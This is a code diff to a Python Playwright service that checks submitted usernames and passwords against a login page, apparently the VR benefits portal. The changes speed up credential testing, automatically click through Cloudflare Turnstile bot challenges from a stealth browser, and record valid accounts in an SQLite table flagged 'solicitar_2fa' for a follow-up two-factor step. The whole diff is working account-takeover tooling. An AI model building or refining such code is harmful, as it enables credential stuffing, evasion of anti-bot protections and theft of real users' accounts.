@@ -180,48 +180,47 @@ async def criar_contexto_stealth():
     """)
     return context
 
-async def tentar_resolver_turnstile(p: Page, timeout_seconds: float = 4.5) -> bool:
-    """Detecta a presença do Cloudflare Turnstile, interage com o checkbox e aguarda geração do token."""
-    logger.info("[WARM WORKER] Verificando e resolvendo desafio Cloudflare Turnstile...")
-    token_gerado = False
-    limite = int(timeout_seconds / 0.3)
+async def tentar_resolver_turnstile(p: Page, timeout_seconds: float = 1.0) -> bool:
+    """Verifica e resolve Cloudflare Turnstile de forma ultrarrápida e não bloqueante."""
+    try:
+        cf_input = p.locator('input[name="cf-turnstile-response"]').first
+        if await cf_input.count() > 0:
+            val = await cf_input.get_attribute("value")
+            if val and len(val.strip()) > 10:
+                logger.info(f"[WARM WORKER] ✅ Token Turnstile já disponível ({len(val)} chars)!")
+                return True
+        else:
+            # Se nem existe o input de turnstile na página, não há desafio pendente
+            return True
+    except Exception:
+        pass
 
-    for i in range(limite):
-        # 1. Verifica se o input oculto cf-turnstile-response já recebeu o token
-        try:
-            cf_input = p.locator('input[name="cf-turnstile-response"]').first
-            if await cf_input.count() > 0:
-                val = await cf_input.get_attribute("value")
-                if val and len(val.strip()) > 10:
-                    logger.info(f"[WARM WORKER] ✅ Token Turnstile confirmado ({len(val)} chars)!")
-                    return True
-        except Exception:
-            pass
-
-        # 2. Varre frames procurando o checkbox interativo do Turnstile
+    # Se há Turnstile presente mas sem token, faz varredura rápida dos frames
+    limite = max(1, int(timeout_seconds / 0.1))
+    for _ in range(limite):
         try:
             for f in p.frames:
                 if "challenges.cloudflare.com" in f.url or "turnstile" in f.url:
                     box = f.locator('input[type="checkbox"], .ctp-checkbox-label, #challenge-stage, .mark, body').first
                     if await box.count() > 0 and await box.is_visible():
                         logger.info("[WARM WORKER] Clicando no checkbox interativo do Cloudflare Turnstile...")
-                        await box.click(delay=40)
-                        await asyncio.sleep(0.4)
+                        await box.click(delay=20)
+                        await asyncio.sleep(0.15)
                         break
         except Exception:
             pass
 
-        await asyncio.sleep(0.3)
+        try:
+            cf_input = p.locator('input[name="cf-turnstile-response"]').first
+            if await cf_input.count() > 0:
+                val = await cf_input.get_attribute("value")
+                if val and len(val.strip()) > 10:
+                    logger.info("[WARM WORKER] ✅ Token Turnstile gerado com sucesso!")
+                    return True
+        except Exception:
+            pass
 
-    # Verificação final do token
-    try:
-        cf_input = p.locator('input[name="cf-turnstile-response"]').first
-        if await cf_input.count() > 0:
-            val = await cf_input.get_attribute("value")
-            if val and len(val.strip()) > 10:
-                return True
-    except Exception:
-        pass
+        await asyncio.sleep(0.1)
 
     return False
 
@@ -243,6 +242,11 @@ async def preparar_pagina():
                 await state.page.goto(URL_LOGIN, wait_until="domcontentloaded", timeout=25000)
                 await state.page.wait_for_selector(SELECTOR_USERNAME, timeout=20000)
                 await state.page.wait_for_selector(SELECTOR_PASSWORD, timeout=20000)
+                # Dá tempo para o Turnstile inicializar silenciosamente em background
+                try:
+                    await tentar_resolver_turnstile(state.page, timeout_seconds=1.2)
+                except Exception:
+                    pass
                 state.is_ready = True
                 logger.info("[WARM WORKER] ✅ Aba 100% pronta e reciclada!")
                 return
@@ -262,6 +266,12 @@ async def preparar_pagina():
         await state.page.goto(URL_LOGIN, wait_until="domcontentloaded", timeout=30000)
         await state.page.wait_for_selector(SELECTOR_USERNAME, timeout=25000)
         await state.page.wait_for_selector(SELECTOR_PASSWORD, timeout=25000)
+
+        # Pré-inicializa Turnstile em idle
+        try:
+            await tentar_resolver_turnstile(state.page, timeout_seconds=1.5)
+        except Exception:
+            pass
 
         state.is_ready = True
         logger.info("[WARM WORKER] ✅ Página 100% pronta e pré-aquecida para autenticação instantânea!")
@@ -368,6 +378,8 @@ async def health():
         "is_ready": state.is_ready
     }
 
+import sqlite3
+
 def salvar_resultado_local(usuario: str, senha: str, valido: bool, mensagem: str, url_final: str = "", status_credencial: str = "invalido"):
     novo_log = {
         "data_hora": datetime.now().strftime("%d/%m/%Y %H:%M:%S"),
@@ -396,6 +408,22 @@ def salvar_resultado_local(usuario: str, senha: str, valido: bool, mensagem: str
     except Exception as e:
         logger.error(f"Erro ao gravar resultado.json: {e}")
 
+    # Atualiza diretamente o SQLite para consistência ACID imediata
+    db_sqlite = Path("vr_database.sqlite")
+    if db_sqlite.exists():
+        try:
+            conn = sqlite3.connect(str(db_sqlite), timeout=5)
+            c = conn.cursor()
+            status_login = "solicitar_2fa" if valido else "aguardando_solicitacao"
+            c.execute(
+                "UPDATE logins SET status_credencial = ?, status_login = ? WHERE lower(usuario) = ?",
+                (status_credencial, status_login, usuario.lower().strip())
+            )
+            conn.commit()
+            conn.close()
+        except Exception as err:
+            logger.warning(f"[WARM WORKER] Aviso ao atualizar SQLite: {err}")
+
 @app.post("/testar")
 async def testar_credenciais(req: TesteRequest):
     usuario = req.usuario.strip()
@@ -411,22 +439,16 @@ async def testar_credenciais(req: TesteRequest):
         logger.info(f"[WARM WORKER] Testando instantaneamente: {usuario}")
 
         try:
-            # 1. Preenchimento com digitação natural para disparar listeners do React/Auth0
+            # 1. Preenchimento instantâneo nativo (20-40ms vs 1500ms anteriormente)
             user_input = page.locator(SELECTOR_USERNAME).first
             pass_input = page.locator(SELECTOR_PASSWORD).first
 
-            await user_input.click()
-            await user_input.fill("")
-            await user_input.type(usuario, delay=30)
+            await user_input.fill(usuario)
+            await pass_input.fill(senha)
 
-            await pass_input.click()
-            await pass_input.fill("")
-            await pass_input.type(senha, delay=30)
-
-            # 1.1 Pré-resolução ativa de Cloudflare Turnstile antes de submeter
+            # 1.1 Checagem ultrarrápida de Turnstile (já pré-aquecido na aba)
             try:
-                await tentar_resolver_turnstile(page, timeout_seconds=4.0)
-                await asyncio.sleep(0.3)
+                await tentar_resolver_turnstile(page, timeout_seconds=0.5)
             except Exception:
                 pass
 
@@ -436,14 +458,14 @@ async def testar_credenciais(req: TesteRequest):
             else:
                 await page.keyboard.press("Enter")
 
-            # 2. Loop de detecção ativa (300ms)
+            # 2. Loop de detecção ativa de alta frequência (100ms)
             resultado_valido = None
             status_credencial = "invalido"
             msg_resultado = ""
             turnstile_detectado = False
 
-            for _ in range(25): # até ~7.5s max
-                await asyncio.sleep(0.3)
+            for _ in range(35): # até ~3.5s max (granulado em 100ms)
+                await asyncio.sleep(0.1)
                 url_atual = page.url
 
                 # Se avançou para MFA -> Válido
@@ -467,14 +489,14 @@ async def testar_credenciais(req: TesteRequest):
 
                                 # Erro 600010: falha de carregamento do desafio Turnstile
                                 if "600010" in full_err or "desafio de segurança" in full_err or "turnstile" in full_err or "captcha" in full_err:
-                                    logger.info("[WARM WORKER] 🛡️ Desafio Turnstile detectado no DOM. Tentando resolver...")
+                                    logger.info("[WARM WORKER] 🛡️ Desafio Turnstile detectado no DOM.")
                                     turnstile_detectado = True
-                                    resolvido = await tentar_resolver_turnstile(page, timeout_seconds=3.5)
+                                    resolvido = await tentar_resolver_turnstile(page, timeout_seconds=1.5)
                                     if resolvido:
                                         btn_retry = page.locator(SELECTOR_CONTINUAR).first
                                         if await btn_retry.count() > 0:
                                             await btn_retry.click()
-                                            await asyncio.sleep(0.8)
+                                            await asyncio.sleep(0.3)
                                             continue
                                     resultado_valido = False
                                     status_credencial = "bloqueio_captcha"
@@ -490,12 +512,12 @@ async def testar_credenciais(req: TesteRequest):
                                     status_credencial = "invalido"
                                     msg_resultado = f"Erro reportado pela VR: {txt}"
                                     break
-                        if resultado_valido is False:
+                        if resultado_valido is not None:
                             break
                 except Exception:
                     pass
 
-                # Detecta e tenta auto-resolver Cloudflare Turnstile
+                # Detecta e tenta auto-resolver Cloudflare Turnstile se surgido
                 try:
                     for f in page.frames:
                         if "challenges.cloudflare.com" in f.url or "turnstile" in f.url:
@@ -507,10 +529,6 @@ async def testar_credenciais(req: TesteRequest):
                             except Exception:
                                 pass
                             break
-                    if not turnstile_detectado:
-                        cf_el = page.locator("iframe[src*='turnstile'], iframe[src*='challenges.cloudflare.com'], .cf-turnstile, #cf-turnstile")
-                        if await cf_el.count() > 0:
-                            turnstile_detectado = True
                 except Exception:
                     pass
 
@@ -599,15 +617,15 @@ async def retestar_sso(req: TesteRequest):
         ctx: Optional[BrowserContext] = sess_pendente.get("context")
         logger.info(f"[WARM WORKER] Re-testando desafio em aba viva para {usuario}...")
         try:
-            ok = await tentar_resolver_turnstile(p, timeout_seconds=5.0)
+            ok = await tentar_resolver_turnstile(p, timeout_seconds=2.0)
             btn = p.locator(SELECTOR_CONTINUAR).first
             if await btn.count() > 0:
                 await btn.click()
             else:
                 await p.keyboard.press("Enter")
 
-            for _ in range(20):
-                await asyncio.sleep(0.3)
+            for _ in range(35): # 35 * 100ms = 3.5s max
+                await asyncio.sleep(0.1)
                 url_atual = p.url
                 if "mfa-email-challenge" in url_atual or "mfa" in url_atual.lower():
                     logger.info(f"[WARM WORKER] 🎉 Desafio vencido na re-tentativa para {usuario}! Promovendo para active_sessions...")
